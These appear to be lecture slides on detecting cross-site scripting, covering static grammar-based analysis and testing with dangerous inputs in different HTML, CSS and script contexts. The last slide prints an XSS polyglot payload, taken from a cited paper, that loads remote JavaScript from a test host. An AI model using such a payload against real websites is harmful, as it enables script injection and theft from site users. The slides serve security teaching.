
### XSS detection 


* static/dynamic program analysis
* trying ‘dangerous’ inputs


### static program analysis example  {.smaller}


* Wasserman and Su, ‘`Static Detection of Cross-Site Scripting Vulnerabilitiues (ICSE’08)
* try to summarize program string operations as context-free grammar (see DMT2) 

   * summary: context-free grammar = string building rules

* mark where user input is in that grammar
* try to solve if way for context-free grammar to include script tag, etc. with user input


###  


![](/web/wassermann-fig1-2){}


### dangerous inputs 


* just try to put code in inputs
* see if browser runs it… 
<hr class="vspace" />
* relatively simple, but…


### dangerous inputs: context  {.smaller}



* problem: need to match context!
 
```
<a href=USER INPUT>
<style type="text/css"
p.some-class {
    font: "USER INPUT", Helvetica, serif;
}
</style>
<script>
if (x == "USER INPUT") {
    ...
}
</script>

```


### a recent paper 


![](/web/kirchner-title){}


### example input 

(with added newlines) 
```
jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=
import('http://testbed:8080/xss.js') )//%0D%0A
%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
\x3csVg/
<sVg/oNloAd=import('http://testbed:8080/xss.js')//>\x3e

```
